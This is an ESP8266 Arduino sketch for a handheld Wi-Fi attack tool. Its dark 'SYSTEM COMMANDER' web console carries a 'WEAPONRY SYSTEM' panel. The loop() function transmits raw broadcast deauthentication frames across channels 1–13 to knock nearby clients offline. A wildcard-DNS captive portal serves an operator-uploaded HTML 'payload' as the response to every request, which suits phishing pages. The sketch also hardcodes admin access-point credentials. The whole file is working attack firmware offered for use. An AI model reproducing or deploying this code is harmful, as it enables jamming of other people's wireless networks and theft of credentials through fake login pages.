#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" { #include "user_interface.h" }

// Konfigurasi Admin
const char* admin_ssid = "GMpro86";
const char* admin_pass = "sangkur87";

Adafruit_SSD1306 display(64, 48, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;
File fsUploadFile;

bool massDeauthActive = false;
String scanResultsHTML = "READY TO SCAN...";

// --- UI DASHBOARD ADMIN (PROFESSIONAL CONSOLE) ---
const char ADMIN_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{background:#0a0a0a;color:#00ff00;font-family:'Courier New',Courier,monospace;margin:0;padding-bottom:80px}
  .container{padding:15px}
  .hdr{border-bottom:1px solid #00ff00;padding:15px;text-align:center;font-weight:bold;letter-spacing:2px;background:#111}
  .card{background:#111;margin-bottom:15px;padding:15px;border:1px solid #333;border-left:4px solid #00ff00}
  .card-red{border-left:4px solid #ff0000}
  .stats{font-size:10px;color:#888;margin-bottom:10px;text-transform:uppercase}
  .btn{border:1px solid #00ff00;background:0;color:#00ff00;padding:12px;width:100%;margin-top:10px;font-weight:bold;text-transform:uppercase;cursor:pointer}
  .btn:active{background:#00ff00;color:#000}
  .btn-red{border-color:#ff0000;color:#ff0000}
  .btn-red:active{background:#ff0000;color:#000}
  .nav{position:fixed;bottom:0;width:100%;background:#111;display:flex;border-top:1px solid #333}
  .item{flex:1;padding:20px;text-align:center;color:#444;font-size:12px;font-weight:bold}
  .active{color:#00ff00;border-top:2px solid #00ff00;background:#1a1a1a}
  .list-item{border-bottom:1px solid #222;padding:10px 0;font-size:11px}
  input[type=file]{background:#111;color:#0f0;padding:10px;width:100%;border:1px dashed #333}
</style></head><body>
<div class="hdr">SYSTEM COMMANDER V8.6</div>
<div class="container">
  <div id="p1">
    <div class="stats">SYSTEM STATUS: <span id="stt">ONLINE</span></div>
    <div class="card card-red">
      <div style="font-size:12px;margin-bottom:10px;color:#ff0000;font-weight:bold">WEAPONRY SYSTEM</div>
      <button class="btn btn-red" onclick="location.href='/mode?m=mass'">EXECUTE MASS DEAUTH</button>
      <button class="btn" onclick="location.href='/mode?m=off'" style="border-color:#ccc;color:#ccc">CEASE FIRE</button>
    </div>
    <div class="card">
      <div style="font-size:12px;margin-bottom:10px;font-weight:bold">SIGINT / RADAR</div>
      <button class="btn" onclick="location.href='/scan'">UPDATE SCANNER</button>
      <div style="margin-top:15px;max-height:200px;overflow-y:auto">%WIFILIST%</div>
    </div>
  </div>
  <div id="p2" style="display:none">
    <div class="card">
      <div style="font-size:12px;margin-bottom:10px;font-weight:bold">PAYLOAD DEPLOYMENT</div>
      <form method="POST" action="/upload" enctype="multipart/form-data">
        <input type="file" name="f" accept=".html"><br><br>
        <button class="btn" type="submit">DEPLOY HTML PAYLOAD</button>
      </form>
      <div style="font-size:9px;color:#555;margin-top:15px">Target redirection: index.html</div>
    </div>
  </div>
</div>
<div class="nav">
  <div id="t1" class="item active" onclick="show(1)">CONSOLE</div>
  <div id="t2" class="item" onclick="show(2)">STORAGE</div>
</div>
<script>
  function show(n){
    document.getElementById('p1').style.display=n==1?'block':'none';
    document.getElementById('p2').style.display=n==2?'block':'none';
    document.getElementById('t1').className='item '+(n==1?'active':'');
    document.getElementById('t2').className='item '+(n==2?'active':'');
  }
</script></body></html>
)rawliteral";

void setup() {
  LittleFS.begin();
  pinMode(2, OUTPUT); digitalWrite(2, HIGH); 
  
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setCursor(0,5);  display.println(">> SYS_INIT");
  display.setCursor(0,20); display.println(">> V8.6_ON");
  display.setCursor(0,35); display.println(">> READY_");
  display.display();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(admin_ssid, admin_pass);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/admin", [](){
    String s = ADMIN_HTML;
    s.replace("%WIFILIST%", scanResultsHTML);
    server.send(200, "text/html", s);
  });

  server.on("/scan", [](){
    int n = WiFi.scanNetworks();
    scanResultsHTML = "";
    for (int i = 0; i < n; ++i) {
      String ssidName = (WiFi.SSID(i) == "") ? "[HIDDEN_NET]" : WiFi.SSID(i);
      scanResultsHTML += "<div class='list-item'>[CH:" + String(WiFi.channel(i)) + "] " + ssidName + " (" + String(WiFi.RSSI(i)) + "dBm)</div>";
    }
    server.sendHeader("Location", "/admin");
    server.send(303);
  });

  server.on("/mode", [](){
    massDeauthActive = (server.arg("m") == "mass");
    server.sendHeader("Location", "/admin");
    server.send(303);
  });

  server.on("/upload", HTTP_POST, [](){ server.send(200, "text/html", "LOADED. <a href='/admin' style='color:#0f0'>RETURN</a>"); }, [](){
    HTTPUpload& upload = server.upload();
    if(upload.status == UPLOAD_FILE_START) fsUploadFile = LittleFS.open("/index.html", "w");
    else if(upload.status == UPLOAD_FILE_WRITE) if(fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize);
    else if(upload.status == UPLOAD_FILE_END) if(fsUploadFile) fsUploadFile.close();
  });

  server.onNotFound([](){
    if(LittleFS.exists("/index.html")){
      File f = LittleFS.open("/index.html", "r");
      server.streamFile(f, "text/html");
      f.close();
    } else server.send(200, "text/html", "<body style='background:#000;color:#0f0;font-family:monospace'><h3>SYSTEM_MAINTENANCE_ID_404</h3><p>PLEASE_WAIT_FOR_UPDATE...</p></body>");
  });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (massDeauthActive) {
    digitalWrite(2, !digitalRead(2)); 
    uint8_t pkt[26] = {0xc0,0,0x3a,0x01, 0xff,0xff,0xff,0xff,0xff,0xff, 0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,1,0};
    for (int ch=1; ch<=13; ch++) {
      wifi_set_channel(ch);
      for (int i=0; i<15; i++) { wifi_send_pkt_freedom(pkt, 26, 0); delay(1); }
      yield();
    }
    display.clearDisplay();
    display.setCursor(0,5);  display.println("> ATTACK");
    display.setCursor(0,20); display.println("> BROADCAST");
    display.setCursor(0,35); display.println("> ACTIVE_");
    display.display();
  } else {
    digitalWrite(2, HIGH); 
    display.clearDisplay();
    display.setCursor(0,5);  display.println("> STANDBY");
    display.setCursor(0,20); display.println("> SYSTEM_OK");
    display.setCursor(0,35); display.println("> GM86_");
    display.display();
  }
}
